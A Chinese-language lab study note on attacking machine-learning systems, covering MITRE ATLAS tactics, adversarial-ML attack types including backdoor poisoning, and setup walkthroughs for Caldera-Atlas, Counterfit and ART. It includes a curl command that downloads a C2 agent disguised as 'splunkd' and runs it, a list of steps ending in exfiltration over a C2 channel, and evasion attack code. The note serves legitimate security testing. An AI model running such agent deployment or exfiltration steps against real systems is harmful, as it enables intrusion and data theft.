# AI攻擊手法以及工具整合
## [Mitre-atlas](https://atlas.mitre.org/)
基於Mitre框架，[atlas解說影片](https://www.youtube.com/watch?v=3FN9v-y-C-w)
![](https://hackmd.io/_uploads/r1jLVpUJT.png)
![image](https://hackmd.io/_uploads/Sy2bz9bBa.png)
![image](https://hackmd.io/_uploads/HJX9jcZH6.png)
### GRC（治理、風險管理與合規）
- 合規風險
- 技術風險
- 名譽風險

### Methodology(方法論)
- **Recon（偵察）**
  - Base Model Discovery（基礎模型發現）
  - Serving Infrastructure（服務基礎架構）
  - Dataset Collection（數據集收集）
- **Model Vulnerabilities（模型漏洞）**
  - Evasion（逃避）
  - Inversion（反轉）
  - Extraction（提取）
  - Poisoning（污染）
  - Membership Inference（成員推斷）
  - Prompt-Injection（提示注入）
- **Technical Vulnerabilities（技術漏洞）**
  - Lack of Authentication（缺乏認證）
  - Insecure Deserialization（不安全的反序列化）
  - Lack of Input Validation（缺乏輸入驗證）
- **Harm and Abuse（傷害與濫用）**
  - Quality-of-Service Harms（服務質量損害）
  - Allocation Harms（分配損害）
  - Inappropriate Use（不當使用）
  - Stereotyping（成見）

### ML Dev（機器學習開發）
- **Pre（前期）**
  - Ideation（概念設計）
- **Train Time（訓練階段）**
  - Data Collection（數據收集）
  - Data Processing（數據處理）
  - Model Training（模型訓練）
- **Inference（推論）**
  - Model Evaluation（模型評估）
  - Model Deployment（模型部署）
- **Post（後期）**
  - System Monitoring（系統監控）
  - EOL（生命周期終結）

### Tech Stack（技術棧）
- **Infra（基礎設施）**
  - Local（本地）
  - Cloud（雲端）

### 技術工具和平台
- Jupyter
- Hugging Face
- pandas
- CUDA
- Torch
- Spark
- Accelerate
- img2dataset
- Fairlearn
- Alibi
- ONNX
- Triton
- MLFlow
- Splunk
- Prometheus
- S3

## Mitre
**按照Mitre att&ck框架
分為以下幾個攻擊流程**
| 戰略名稱 | 說明     | 常見攻擊手法 | 相關工具 |
| :---     | :---     | :---:        |  :---  |
|[偵查](https://atlas.mitre.org/tactics/AML.TA0002/)|收集目標的資訊|掃描、搜索受害者公開資料(社交工程)|Nmap|
|[資源開發](https://atlas.mitre.org/tactics/AML.TA0003/)|準備好需要的各種技術資源|獲取公開模型、工具收集|None|
|[初期存取](https://atlas.mitre.org/tactics/AML.TA0004/)|摸索入侵途徑的方法|網路釣魚、外部遠端服務等
|[執行](https://atlas.mitre.org/tactics/AML.TA0000/)|執行惡意程式碼和惡意指令的方式|腳本、用戶執行、元件物件模型
|[持續性](https://atlas.mitre.org/tactics/AML.TA0006/)|成功入侵系統後，能持續保持|外部遠端服務、啟動或登入自動執行
|[防禦規避](https://atlas.mitre.org/tactics/AML.TA0007/)|在發動攻擊的同時，繞過系統防禦機制的方法|掃描、搜索受害者公開資料(社交工程)
|[發現](https://atlas.mitre.org/tactics/AML.TA0008/)|能窺探內部網段及系統環境的方法|獲取公開模型、工具收集
|[蒐集](https://atlas.mitre.org/tactics/AML.TA0009/)|能盜取敏感資料的方法|腳本、用戶執行、元件物件模型
|[攻擊階段](https://atlas.mitre.org/tactics/AML.TA0001/)|攻擊者正在利用他們對目標系統的瞭解和訪問來定製攻擊。|Poison ML 模型、製作對抗數據
|[滲出](https://atlas.mitre.org/tactics/AML.TA0010/)|攜出及外流敏感資訊的方法|藉由ML API進行滲出、網路手段進行滲出
|[衝擊](https://atlas.mitre.org/tactics/AML.TA0011/)|攻破系統後，對系統造成的危害種類|規避ML、侵蝕NL模型
## [Adversarial Machine Learning(對抗式攻擊)](https://atlas.mitre.org/resources/adversarial-ml-101/)

**底下更細分，以下幾種攻擊，並分成訓練中，模型輸出**

| 攻擊手法 		        | 說明	|防禦工具或對策|
| :---			        | :---      |:----------------|
| Model Evasion         |Evasion攻擊是最常見也最容易應用的攻擊。深度學習也和傳統機器學習一樣，會讀入一些輸入資料(Input data)，經由深度學習模型和資料間的計算，得出對此筆資料的預測機率值(Probability)或分類(Classification)資訊。而Evasion攻擊就是希望對輸入資料進行非常細微的修改，大幅改變深度學習模型的預測結果。  |boundary、carlini、deepfool、elastic_net、hop_skip_jump、newtonfool、pixel_threshold、projected_gradient_descent_numpy、saliency_map、simba、spatial_transformation、universal_perturbation、virtual_adversarial、wasserstein、a2t_yoo_2021、bae_garg_2019、bert_attack_li_2020、checklist_ribeiro_2020、clare_li_2020、deepwordbug_gao_2018、faster_genetic_algorithm_jia_2019、genetic_algorithm_alzantot_2018、hotflip_ebrahimi_2017、iga_wang_2019、input_reduction_feng_2018、kuleshov_2017、morpheus_tan_2020、pruthi_2019、pso_zang_2020、pwws_ren_2019、seq2sick_cheng_2018_blackbox、textbugger_li_2018、textfooler_jin_2019|
| Functional Extraction  ed| 攻擊者能夠通過反覆運算查詢模型來恢復功能等效的模型。這允許攻擊者在進一步攻擊在線模型之前檢查模型的離線副本。  |
| Model Poisoning 	    | 攻擊者污染 ML 系統的訓練數據，以便在推理時獲得所需的結果。通過對訓練數據的影響，攻擊者可以創建「後門」，其中任意輸入將導致特定輸出。該模型可以「重新程式設計」以執行新的不需要的任務。此外，訪問訓練數據將允許攻擊者創建離線模型並創建模型規避。訪問訓練數據也可能導致私有數據洩露。  |
| Model Inversion 	    | 攻擊者恢復用於訓練模型的特徵。成功的攻擊將導致攻擊者能夠發起成員資格推理攻擊。此攻擊可能導致私有數據洩露。  | copycat_cnn、functionally_equivalent_extraction
| Traditional Attacks   | 攻擊者使用完善的 TTP 來實現其目標。 | 
|common-corruption|通常是對數據的一種形式。這種攻擊旨在測試機器學習模型的韌性，尤其是在面對常見的數據變異或噪聲時的表現。這些常見的數據變異可以包括拼寫錯誤、圖像噪聲、文本中的簡單變化等等。|
Model Inference|使用已經訓練好的機器學習模型來進行預測。這是模型的正常操作，其中模型接收輸入數據，並生成相應的輸出。模型推斷通常是為了解決特定的問題，如圖像分類、語音識別等。|black_box_rule_based、 label_only_boundary_distance、mi_face、white_box_decision_tree
## [OpenSource Security Tools](https://github.com/RiccardoBiosas/awesome-MLSecOps)
工具名稱 | 作業系統 | 介紹 | 做了甚麼尚未解決安裝環境問題
--- | --- | --- | ---
Caldera-Atlas | Kali | 專注於機器學習模型的安全性分析 | - 建置成功, 成功使用Arsenal插件, 實際應用上覺得不太適合
Counterfit | Windows | 微軟開發的工具，專注於自動化的對抗性攻擊測試，適合於安全性測試和評估。 | - 建置成功, 展示了一些攻擊方式, 儘管提供了多種攻擊類型，但缺乏文獻和參數資料
Adversarial Robustness Toolbox (ART) | Colab | 提供全面的對抗性攻擊、防禦和模型魯棒性評估方法 | - 建置成功, 展示了多種攻擊方式, 提供了更多文獻來源, 參數清晰易懂, 在實務中更實用
Foolbox | Colab | 專注於對抗性攻擊，支持多種深度學習框架 | - 建置成功, 專注於對抗性攻擊
CleverHans | Colab | 用於對抗性攻擊和防禦的Python庫 | [尚未解決的安裝環境問題]
SECML | Colab | 用於機器學習的安全性分析和研究 | [尚未解決的安裝環境問題]


**工具能用以下幾種**
- [caldera-atlas](https://github.com/mitre-atlas/caldera-atlas)
  ```bash
  #git clone前需要先建立github ssh金鑰
  $ssh-keygen
  $cd ~/.ssh
  $cat ~/.ssh/id_rsa.pub #印出來
  ```
  
![](https://hackmd.io/_uploads/By8JYnDxp.png)

![](https://hackmd.io/_uploads/Hku9F3Dxa.png)

![](https://hackmd.io/_uploads/S15DFhvlT.png)


    
    
到[github金鑰](https://github.com/settings/keys)新增公鑰就好了
    
```bash
$git clone --recursive git@github.com:mitre-atlas/caldera-atlas.git
$cd caldera-atlas
$sudo docker-compose build#沒有的按照指示pip下載就可以了
$sudo docker-compose up -d
```
![](https://hackmd.io/_uploads/S1sElyOxa.png)

這樣就建完了可以連上https://localhost:8888/
    帳號密碼admin/admin
![](https://hackmd.io/_uploads/HyU5gJ_xa.png)

點選左邊的Agent開始部屬靶機
![](https://hackmd.io/_uploads/Bkf1o1OlT.png)
```bash=
$cd ml-vulhub/envs/example-00-ml-dev

# perform build and initialization steps
$sudo docker-compose build
$sudo ./init.sh

$sudo docker-compose up -d
$sudo docker-compose exec mldev bash -c 'server=http://host.docker.internal:8888; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download -o splunkd; chmod u+x splunkd; ./splunkd -server $server -group red -v'
```
部屬完就可以上面就會顯示Alive
![](https://hackmd.io/_uploads/S1XW3kOgT.png)
選擇左邊的adversaries可以配置一些手法，如圖中我選Discovery
![](https://hackmd.io/_uploads/HJ2zC1dlp.png)
選擇左邊的operations可以倚靠自己新增的手法，去攻擊測試
![](https://hackmd.io/_uploads/HkKkVlugp.png)
也可以選擇左邊的插件arsenal中的攻擊手法
![](https://hackmd.io/_uploads/HJZ58e_lp.png)

Arsenal 裡面的TTPs
1. Create a staging directory for exfiltration.
   - 為外洩創建一個暫存目錄。

2. Discover GPUs present
   - 檢測當前存在的GPU。

3. Find Tensorflow model checkpoint files with the extension: .ckpt
   - 查找擁有副檔名為 .ckpt 的Tensorflow模型檔案。

4. Search and Stage Tensorflow model files
   - 搜尋並準備Tensorflow模型檔案以進行外洩。

5. Install Python
   - 安裝Python。

6. Download and install Python and it’s dependencies () where the agent is deployed.Python 3.7+
   - 下載並安裝Python及其相關依賴項（）到代理程式所部署的位置。Python版本需為3.7+。

7. Determine Python3 version
   - 確認Python3的版本。

8. Determine Python3 is installed and version () where the agent is deployed.Python 3.7+
   - 確認Python3是否已安裝，並顯示版本（）到代理程式所部署的位置。Python版本需為3.7+。

9. PIP Install Tensorflow-GPU
   - 使用PIP安裝Tensorflow-GPU。

10. PIP Install Tensorflow-CPU
    - 使用PIP安裝Tensorflow-CPU。

11. CNN Image Classifier
    - 使用CNN圖像分類器。

12. Search for images and apply an image classifier
    - 搜尋圖像並應用圖像分類器。

13. Compress staged directory
    - 壓縮已準備好的目錄。

14. Compress a directory on the file system
    - 壓縮檔案系統上的一個目錄。

15. Exfiltrate staged directory over the C2 channel
    - 透過C2通道外洩已準備好的目錄。


- [counterfit](https://github.com/Azure/counterfit/)
**Microsoft文章 [內文](https://www.microsoft.com/en-us/security/blog/2021/05/03/ai-security-risk-assessment-using-counterfi)Conterfit是一個開源專案，安全測試AI系統的自動化工具，Counterfit 是用於評估機器學習系統安全性的通用自動化層。它將幾個現有的對抗框架放在一個工具下，或者允許用戶創建自己的框架。**
  - 使用系統 Windows
  - 需要先安裝 Anaconda Python 和 git。
  - 打開ps或cmd或是Anaconda shell
      ```bash
      $conda update -c conda-forge --all -y
      ```
      ![](https://hackmd.io/_uploads/B1FkLwcga.png)
      
      ```bash
      $conda create --yes -n counterfit python=3.8.0
      $conda activate counterfit
      ```
      ![](https://hackmd.io/_uploads/ByKULP9lT.png)
      ```bash
      $git clone -b main https://github.com/Azure/counterfit.git
      ```
      ![](https://hackmd.io/_uploads/BkkoLv5eT.png)
      ```bash
      $cd counterfit
      $pip install .[dev]
      $counterfit
      ```
      ![](https://hackmd.io/_uploads/rJklJqcep.png)
      - 使用方式
      有一些攻擊手段清單 以及目標
      ```bash
      $list targets #目標清單
      $list attacks #攻擊手法清單(類型、分類)
      $help
      ```
      ![](https://hackmd.io/_uploads/rJfOe9clT.png)
      
      ![](https://hackmd.io/_uploads/S1H0wo9gT.png)
      ![](https://hackmd.io/_uploads/rkX3139ep.png)
      
    ##  攻擊手段分類
    ![](https://hackmd.io/_uploads/r1R_eq5lp.png)
    

    |     名稱          |  階段| 類型|說明 |
    | ---------------------------------- | ------------------------------- | ---------- | --- |
    | black_box_rule_based               | inference(推論)                 | 圖片、表格 |     |     |     |     |
    | label_only_boundary_distance       | inference(推論)                 | 圖片、表格 |這篇論文提出了僅基於模型預測標籤的成員推斷攻擊方法。主要思路是:通過查詢模型對數據樣本及其增強版本的預測標籤,來判斷樣本是否為模型的訓練數據。作者提出了基於數據增強和決策邊界距離的攻擊手法。這種僅需要預測標籤的攻擊,比需要模型置信度向量的現有攻擊更普適,也能達到相當的攻擊效果。論文還指出許多現有防禦方法無法抵禦這種標籤攻擊,需要從減少過擬合等角度進行防禦。     |     |     |     |
    | mi_face                            | inference(推論)                 | 圖片、表格 |     |     |     |     |
    | white_box_decision_tree            | inference(推論)                 | unknown    |     |     |     |     |
    | copycat_cnn                        | inversion(逆向)                 | 圖片       | 這篇論文提出了一種從黑箱模型中提取知識的攻擊方法。主要思路是:使用隨機非標註數據作為輸入,查詢目標模型並獲取其預測標籤,構建假數據集。使用這個假數據集訓練一個模仿模型(copycat model)。實驗表明,模仿模型可以達到與目標模型相當的性能,實現對模型知識的提取。這種黑箱攻擊僅通過查詢接口獲取標籤信息,就可以訓練出與目標模型性能相近的模型,對於保護商業模型的安全性形成威脅。         |     |     |     |
    | functionally_equivalent_extraction | inversion (逆向)                | 圖片、表格 |這篇論文提出了一種從黑箱模型中直接提取參數的方法,實現功能等價提取。主要思路是:找到模型的關鍵點,每個點對應一個隱層單元。比較相鄰線性區域的差異,復原第一層權重矩陣。通過全局資訊恢復權重正負號。以上取得第一層參數,然後用線性方程組解出第二層。這種攻擊只需要模型的預測標籤,就可以實現幾乎100%恢復參數的效果。儘管有理論困難,但對簡單模型仍具可行性。     |     |     |
    | boundary                           | evasion(規避)                   | 圖片、表格 |     |     |     |     |
    | carlini                            | evasion(規避)                   | 圖片、表格 |     |     |     |     |
    | deepfool                           | evasion(規避)                   | 圖片、表格 |這篇論文提出了一種生成對抗 EXAMPLES 的算法 DeepFool,主要思路是:對模型進行線性化近似,計算使模型誤判的最小扰動。迭代更新,逼近使模型誤判的最優解。實驗表明,該算法可以有效地產生模型誤判的小幅度扰動,用於評估模型的鲁棒性。相較於其他對抗攻擊方法,DeepFool 算法計算扰动更準確,也使模型更敏感,可作為评估模型鲁棒性的有效工具。     |     |     |     |
    | elastic_net                        | evasion(規避)                   | 圖片、表格 |彈性網絡（Elastic Net）正則化擴展到所有廣義線性模型（GLMs）和Cox模型。作者介紹了一種計算高效的算法來實現這一目的。論文還討論了用於評估模型性能的實用函數。彈性網絡正則化結合了L1和L2懲罰項，尤其適用於處理相關特徵。論文詳細說明了實施細節，包括使用FORTRAN進行計算效率和R進行靈活性。該論文特別強調了glmnet R包在處理這些模型方面的能力。
     |     |     |     |
    | hop_skip_jump                      | evasion(規避)                   | 圖片、表格 |     |     |     |     |
    | newtonfool                         | evasion(規避)                   | 圖片、表格 |     |     |     |     |
    | pixel_threshold                    | evasion(規避)                   | 圖片       |     |     |     |     |
    | projected_gradient_descent_numpy   | evasion(規避)                   | 圖片、表格 |     |     |     |     |
    | saliency_map                       | evasion(規避)                   | 圖片、表格 |     |     |     |     |
    | simba                              | evasion(規避)                   | 圖片       |     |     |     |     |
    | spatial_transformation             | evasion(規避)                   | 圖片、表格 |     |     |     |     |
    | universal_perturbation             | evasion(規避)                   | 圖片       |     |     |     |     |
    | virtual_adversarial                | evasion(規避)                   | 圖片       |     |     |     |     |
    | wasserstein                        | evasion(規避)                   | 圖片       |     |     |     |     |
    | a2t_yoo_2021                       | evasion(規避)                   | 文本       |     |     |     |     |
    | bae_garg_2019                      | evasion(規避)                   | 文本       |     |     |     |     |
    | bert_attack_li_2020                | evasion(規避)                   | 文本       |     |     |     |     |
    | checklist_ribeiro_2020             | evasion(規避)                   | 文本       |     |     |     |     |
    | clare_li_2020                      | evasion(規避)                   | 文本       |     |     |     |     |
    | deepwordbug_gao_2018               | evasion(規避)                   | 文本       |     |     |     |     |
    | faster_genetic_algorithm_jia_2019  | evasion(規避)                   | 文本       |     |     |     |     |
    | genetic_algorithm_alzantot_2018    | evasion(規避)                   | 文本       |     |     |     |     |
    | hotflip_ebrahimi_2017              | evasion(規避)                   | 文本       |     |     |     |     |
    | iga_wang_2019                      | evasion(規避)                   | 文本       |     |     |     |     |
    | input_reduction_feng_2018          | evasion(規避)                   | 文本       |     |     |     |     |
    | kuleshov_2017                      | evasion(規避)                   | 文本       |     |     |     |     |
    | morpheus_tan_2020                  | evasion(規避)                   | 文本       |     |     |     |     |
    | pruthi_2019                        | evasion(規避)                   | 文本       |     |     |     |     |
    | pso_zang_2020                      | evasion(規避)                   | 文本       |     |     |     |     |
    | pwws_ren_2019                      | evasion(規避)                   | 文本       |     |     |     |     |
    | seq2sick_cheng_2018_blackbox       | evasion(規避)                   | 文本       |     |     |     |     |
    | textbugger_li_2018                 | evasion(規避)                   | 文本       |     |     |     |     |
    | textfooler_jin_2019                | evasion(規避)                   | 文本       |     |     |     |     |
    | ApplyLambda                        | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | Blur                               | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | Brightness                         | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | ChangeAspectRatio                  | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | ClipImageSize                      | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | ColorJitter                        | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | Contrast                           | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | ConvertColor                       | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | Crop                               | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | EncodingQuality                    | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | Grayscale                          | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | Crop                               | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | EncodingQuality                    | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | Grayscale                          | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | HFlip                              | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | MemeFormat                         | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | Opacity                            | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | OverlayEmoji                       | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | OverlayOntoScreenshot              | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | OverlayStripes                     | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | OverlayText                        | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | Pad                                | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | PadSquare                          | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | PerspectiveTransform               | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | Pixelization                       | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | RandomEmojiOverlay                 | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | RandomNoise                        | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
    | Resize                             | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
    | Rotate                             | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
    | Saturation                         | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
    | Scale                              | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
    | Sharpen                            | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
    | ShufflePixels                      | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
    | VFlip                              | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
    
    攻擊參數說明
    
    | Algo Parameters      | 運算參數   | 說明                                                                  |
    | -------------------- | ---------- | --------------------------------------------------------------------- |
    | batch_size (int)     | 批次大小   | 推斷期間估算器使用的批次大小。                                        |
    | clip_values (list)   | 剪切值     |  用於限制輸入數據值的範圍，以確保它們在指定的範圍內。參見攻擊文件。    |
    | curr_iter (int)      | 當前迭代   |  表示當前正在進行的迭代次數。                                          |
    | init_eval (int)      | 初始評估   |  用於估算梯度的初始評估次數。                                          |
    | init_size (int)      | 初始大小   |  初始生成對抗性示例的最大嘗試次數。                                    |
    | max_eval (int)       | 最大評估   | 用於估算梯度的最大評估次數。                                          |
    | max_iter (int)       | 最大迭代   |  最大迭代次數。                                                        |
    | norm (int)           | 正則化範數 |  正則化範數的順序。可能的值："inf"、np.inf 或 2。                      |
    | targeted (bool)      | 有目標攻擊 |  攻擊是否針對特定類別。                                                |
    | verbose (bool)       | 詳細信息   |  顯示進度條。                                                          |
    | target_labels (int)  | 目標標籤   |  有目標攻擊的目標標籤。                                       ||                                                                                  
    | CFAttack 選項        |            |                                                                         |
    | ---------------- | ---------  |  -----------------------------------|
    | sample_index (int)   | 樣本索引   |  要攻擊的樣本索引。                                                    |
    | optimize (bool)      | 優化模型   |  使用 Optuna 優化攻擊參數。                                            |
    | logger (str)         | 記錄器     |  用於記錄查詢的記錄器。                                                |


      ```bash
      counterfit> $set_target satellite #設置目標
      satellite> $set_attack hop_skip_jump #設置攻擊
      satellite>HopSkipJump:fb58020f> $set_params --sample_index 5 --norm 2 --max_iter 10 --max_eval 5000 --verbose true#設置攻擊參數
      satellite>HopSkipJump:fb58020f> $run  #開始跑攻擊
      ```
      ![](https://hackmd.io/_uploads/S1QIEioea.png)
      一開始的圖片
      ![](https://hackmd.io/_uploads/HJtMSjsxp.png)
      
      訓練出來的圖片，找不到
      ![](https://hackmd.io/_uploads/HkDdH0n-6.png)
      
      目標設為creditfraud時的bug 
      ![](https://hackmd.io/_uploads/SyjHERhW6.png)
      
      目標設為digits_keras時的bug
      ![](https://hackmd.io/_uploads/SJOXKR2ZT.png)
      
       目標設為digits_mlp時的bug
      ![](https://hackmd.io/_uploads/Hya_tChWT.png)
       目標設為movie_reviews的demo
       ```bash
      counterfit> $set_target movie_reviews #設置目標
      satellite> $predict -i range(5)#可以查原始的資料
      satellite> $set_attack deepwordbug_gao_2018  #設置攻擊
      satellite>HopSkipJump:fb58020f> $set_params --sample_index 3#設置攻擊參數
      satellite>HopSkipJump:fb58020f> $run  #開始跑攻擊
      ```
      ![](https://hackmd.io/_uploads/r1twFb6Wa.png)
      ![](https://hackmd.io/_uploads/SyC-9bTZp.png)
      可以看到圖中有許多訊息
      ![](https://hackmd.io/_uploads/S1xAUWf6ZT.png)

    1. `Success`：攻擊是否成功。在這個示例中，值為 `1/1`，表示攻擊成功了1次（成功1次，總共1次）。

    2. `Elapsed time`：攻擊所花費的時間，以秒為單位。在這個示例中，值為 `24.7` 秒。

    3. `Total Queries`：總共的查詢數量。在這個示例中，值為 `157 (6.3 query/sec)`，表示總共執行了157次查詢，每秒約執行6.3次查詢。

    接下來是第二個表格，其中包含更多有關攻擊的詳細信息：

    1. `Sample Index`：樣本索引，用於識別攻擊的目標樣本。在這個示例中，值為 `3`。

    2. `Input Label (conf)`：原始輸入的標籤（label）和對應的置信度（confidence）。在這個示例中，原始標籤為 `1`，對應的置信度是 `0.5554`。

    3. `Adversarial Label (conf)`：對抗性輸入的標籤（label）和對應的置信度（confidence）。在這個示例中，對抗性標籤為 `0`，對應的置信度是 `0.7417`。

    4. `% edit dist.`：編輯距離的百分比，表示原始輸入和對抗性輸入之間的相似度。在這個示例中，值為 `0.0025`，表示兩者非常相似。

    5. `Adversarial Input`：對抗性輸入的內容，即攻擊生成的修改後的輸入。

    6. `Success`：攻擊是否成功。在這個示例中，值為 `True`，表示攻擊成功。

    這些信息用於評估攻擊的效果，包括成功率、執行時間、輸入和輸出之間的差異等。
- [ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox/blob/main/README-cn.md)
對抗性魯棒性工具集（ART）是一個用於機器學習安全性的Python庫。ART由Linux Foundation AI＆Data Foundation（LF AI＆Data）所提供。ART提供的工具可協助開發人員和研究人員針對以下方面捍衛和評估機器學習模型和應用程序：逃逸、數據污染、模型提取和推斷的對抗性威脅。ART支援所有流行的機器學習框架（包括TensorFlow、Keras、PyTorch、MXNet、scikit-learn、XGBoost、LightGBM、CatBoost、GPy等），適用於各種數據類型（包括圖像、表格、音頻、視頻等）和機器學習任務（如分類、物體檢測、語音識別、生成模型、身份驗證等）。

### Adversarial Robustness Toolbox (ART) 概覽

#### 簡介
Adversarial Robustness Toolbox (ART) 是一個針對機器學習安全的 Python 函式庫。它提供工具，使開發者和研究人員能夠針對逃避、投毒、提取和推論等對抗性威脅評估、防禦、認證和驗證機器學習模型和應用程序。

#### 支持的機器學習框架
ART 支持以下機器學習框架：
- TensorFlow (v1 和 v2)
- Keras
- PyTorch
- MXNet
- Scikit-learn
- XGBoost
- LightGBM
- CatBoost
- GPy

此外，ART 支持所有數據類型（圖像、表格、音頻、視頻等）和機器學習任務（分類、對象檢測、生成、認證等）。

#### 模型保存格式
不同的機器學習框架有不同的模型保存格式：
- TensorFlow：`.pb` 或 SavedModel 格式
- Keras：`.h5` 格式
- PyTorch：`.pt` 或 `.pth` 格式
- MXNet：`.params` 和 JSON 格式
- Scikit-learn：使用 `pickle` 序列化
- XGBoost：`.bin` 格式
- LightGBM：`.txt` 或 `.bin` 格式
- CatBoost：`.cbm` 格式
- GPy：使用 `pickle` 或其自己的序列化格式

#### 攻擊和防禦方法
ART 包含了多種攻擊和防禦方法，包括但不限於：
- 逃避攻擊
- 投毒攻擊
- 提取攻擊
- 推論攻擊
- 對應的防禦策略

#### 使用限制和兼容性
具體的限制和兼容性可能取決於模型的特定細節，例如模型的架構、使用的數據類型和特定的機器學習任務。如果模型基於上述支持的框架之一構建，則應能夠使用 ART 進行測試。

---

資料來源：[Adversarial Robustness Toolbox 官方文檔](https://adversarial-robustness-toolbox.readthedocs.io/en/latest/)
安裝方式[colab](https://colab.research.google.com/drive/1q1FN-xA0HDP2DufvjKGWayU4TAqGHr1e?usp=sharing)

    ```bash
    $pip install adversarial-robustness-toolbox
    $pip install adversarial-robustness-toolbox[option_name]
    #docs: 文檔
    #catboost: CatBoost
    #gpy: GPy
    #keras: Keras
    #lightgbm: LightGBM
    #mxnet: MXNet
    #tensorflow: TensorFlow
    #tensorflow_image: TensorFlow + 圖像/視頻
    #tensorflow_audio: TensorFlow + 音頻
    #pytorch: PyTorch
    #pytorch_image: PyTorch + 圖像/視頻
    #pytorch_audio: PyTorch + 音頻
    #xgboost: XGBboost
    #lingvo_asr: Lingvo ASR
    #all: 所有依賴項
    #non_framework: 所有非框架依賴項
    ```
    demo 
    使用Adversarial Robustness Toolbox (ART)和TensorFlow v1.x來展示如何訓練一個模型並生成對抗性範例
    
    這個腳本展示了如何使用ART與TensorFlow v1.x結合的簡單示例。示例在MNIST數據集上訓練了一個小模型，
並使用Fast Gradient Sign Method創建對抗性範例。在這裡，我們使用ART分類器來訓練模型，
也可以向ART分類器提供預訓練的模型。
腳本的參數是為了減少計算需求而選擇的，並不是為了最佳化準確性。
#### demo
##### tensorflow

```python
    import tensorflow.compat.v1 as tf
    import numpy as np

    tf.compat.v1.disable_eager_execution()  # Added to prevent Tensorflow execution error

    from art.attacks.evasion import FastGradientMethod
    from art.estimators.classification import TensorFlowClassifier
    from art.utils import load_mnist

    #第1步：載入MNIST數據集

    (x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()

    # 第2步：建立模型

    input_ph = tf.placeholder(tf.float32, shape=[None, 28, 28, 1])
    labels_ph = tf.placeholder(tf.int32, shape=[None, 10])

    x = tf.layers.conv2d(input_ph, filters=4, kernel_size=5, activation=tf.nn.relu)
    x = tf.layers.max_pooling2d(x, 2, 2)
    x = tf.layers.conv2d(x, filters=10, kernel_size=5, activation=tf.nn.relu)
    x = tf.layers.max_pooling2d(x, 2, 2)
    x = tf.layers.flatten(x)
    x = tf.layers.dense(x, 100, activation=tf.nn.relu)
    logits = tf.layers.dense(x, 10)

    loss = tf.reduce_mean(tf.losses.softmax_cross_entropy(logits=logits, onehot_labels=labels_ph))
    optimizer = tf.train.AdamOptimizer(learning_rate=0.01)
    train = optimizer.minimize(loss)
    sess = tf.Session()
    sess.run(tf.global_variables_initializer())

    # 第3步：建立ART分類器

    classifier = TensorFlowClassifier(
        clip_values=(min_pixel_value, max_pixel_value),
        input_ph=input_ph,
        output=logits,
        labels_ph=labels_ph,
        train=train,
        loss=loss,
        learning=None,
        sess=sess,
        preprocessing_defences=[],
    )

    # 第4步：訓練ART分類器

    classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)

    # 第5步：在原始測試數據上評估ART分類器

    predictions = classifier.predict(x_test)
    accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
    print("Accuracy on benign test examples: {}%".format(accuracy * 100))

    # 第6步：生成對抗性測試範例
    attack = FastGradientMethod(estimator=classifier, eps=0.2)
    x_test_adv = attack.generate(x=x_test)

    # 第7步：在對抗性測試數據上評估ART分類器

    predictions = classifier.predict(x_test_adv)
    accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
    print("Accuracy on adversarial test examples: {}%".format(accuracy * 100))
```
    
![](https://hackmd.io/_uploads/ByON47Zm6.png)
Accuracy on benign test examples: 97.71%: 在原始測試數據上，模型的準確性為97.71%。
Accuracy on adversarial test examples: 44.32%: 在對抗性測試數據上，模型的準確性下降到44.32%
##### keras

```python
# 這個腳本展示了一個使用 ART 和 Keras 的簡單示例。這個示例在 MNIST 數據集上訓練一個小型模型
# 並使用快速梯度符號方法創建對抗性示例。這裡我們使用 ART 分類器來訓練模型，
# 也可以向 ART 分類器提供一個預訓練的模型。
# 腳本中選擇的參數是為了減少計算需求，並不是為了最佳準確度。

import tensorflow as tf

tf.compat.v1.disable_eager_execution()
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Flatten, Conv2D, MaxPooling2D
from tensorflow.keras.losses import categorical_crossentropy
from tensorflow.keras.optimizers.legacy import Adam
import numpy as np

from art.attacks.evasion import FastGradientMethod
from art.estimators.classification import KerasClassifier
from art.utils import load_mnist

# 步驟 1：加載 MNIST 數據集

(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()

# 步驟 2：創建模型

model = Sequential()
